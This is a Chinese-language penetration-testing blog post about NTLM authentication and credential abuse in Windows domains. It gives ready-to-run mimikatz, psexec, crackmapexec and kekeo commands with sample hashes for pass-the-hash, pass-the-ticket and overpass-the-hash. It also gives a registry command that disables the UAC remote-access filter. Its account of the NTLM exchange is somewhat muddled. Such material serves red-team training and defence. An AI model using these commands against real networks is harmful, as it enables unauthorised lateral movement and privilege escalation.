---
title: "Mimikatz 哈希与票据传递"
date: 2019-07-16T00:00:00+08:00
draft: false
author: "X1r0z"

tags: ['mimikatz','domain']
categories: [' 内网渗透']

hiddenFromHomePage: false
hiddenFromSearch: false

toc:
  enable: true
math:
  enable: false
lightgallery: false
---

NTLM 协议以及 Mimikatz 哈希与票据传递

<!--more-->

## NTLM 协议

A 想访问 B, 双方先确定协议版本(NTLM v1/NTLM v2).

A 向 B 发送用户名信息, B 接受到用户名后用该用户的 NTLM Hash 加密 Challenge (8位/16位随机数) 作为 Challenge1 (Net-NTLM v1 Hash/Net-NTLM v2 Hash), 之后将 Challenge 发送给 A.

A 使用登录账号的 NTLM Hash 加密 Challenge 作为 Response 发送给 B.

B 接收到 Response 将其与 Challenge1 进行比对, 一致则为认证通过.

## pth (Pass the Hash)

从 NTLM 协议可以知道, 主机间的访问其实跟明文密码是一点关系也没有的, 正常请求时输入的密码也会被加密成 NTLM Hash, 再生成 Net-NTLM Hash.

由此引申出一个手段, 叫做 `Pass the Hash`, 顾名思义, `pth` 通过目标主机的用户名和 Hash 来访问指定机器.

### mimikatz

```
sekurlsa::pth /user:administrator /ntlm:aa5c294fbb6f8b8ae6223ba08805894e /domain:WIN7
```

```
psexec \\WIN7 whoami
```

### crackmapexec

```
crackmapexec WIN7 -u administrator -H aa5c294fbb6f8b8ae6223ba08805894e -d WIN7 -x whoami
```

### UAC

注意 windows 2008 及以上系统在默认情况下开启 UAC 策略, 不允许 administrator 以外的其它本地管理员用户访问远程资源.

可通过更改注册表关闭 UAC 策略.

域内用户不受此限制.

```
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\system /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f
```

另有更多工具, 在此不再赘述.

## ptt (Pass the Ticket)

ptt 多用于 Kerberos 协议中, 即域环境内. 例如 Golden Ticket, Silver Ticket 以及 ms14-068 都通过 ptt 方式来提升权限.

ptt 相较于 pth 的好处是它无须本地管理员权限, 默认在 mimikatz 中进行 `sekurlsa::pth` 时须将其以管理员权限运行. 但 ptt 只能用于域环境内, 而 pth 在工作组和域内都可以使用.

ptt 的原理类似于 Golden Ticket, 它通过指定账户的用户名和 Hash 来生成一份高权限的 TGT 以请求不同的 TGS Ticket 来达到访问域内资源的目的.

通过 keko 生成 TGT.

```
tgt::ask /domain:test.com /user:administrator /ntlm:aa5c294fbb6f8b8ae6223ba08805894e
```

通过 mimikatz 导入 TGT.

```
kerberos::ptt ticket.kirbi
```

## ptk (Pass the Key/Over Pass the Hash)

ptk 为什么没有说呢, 因为自己在本地测试的时候总是不成功. 这里仅给出示例代码.

```
sekurlsa::pth /user:test /domain:test.com /aes256:54069d7bc9b69fd1a86817bd887f6f4e84a3c858c46081e4b443ab07a52e9a69
```